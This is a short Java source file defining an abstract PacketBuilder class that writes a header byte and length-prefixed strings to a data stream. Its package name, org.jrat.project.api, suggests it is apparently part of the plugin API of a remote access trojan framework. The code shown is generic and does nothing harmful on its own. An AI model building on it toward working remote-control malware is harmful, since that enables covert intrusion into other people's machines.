package org.jrat.project.api;

import java.io.DataOutputStream;

public abstract class PacketBuilder {
	
	private DataOutputStream dos;
	private byte header;
	
	public PacketBuilder(DataOutputStream dos, byte header) {
		this.dos = dos;
		this.header = header;
	}
		
	public abstract void write(DataOutputStream dos) throws Exception;
	
	public final void writeHeader() throws Exception {
		dos.writeByte(header);
	}
	
	public final void writeString(String s) throws Exception {
		dos.writeShort(s.length());
		dos.writeChars(s);
	}
	
}
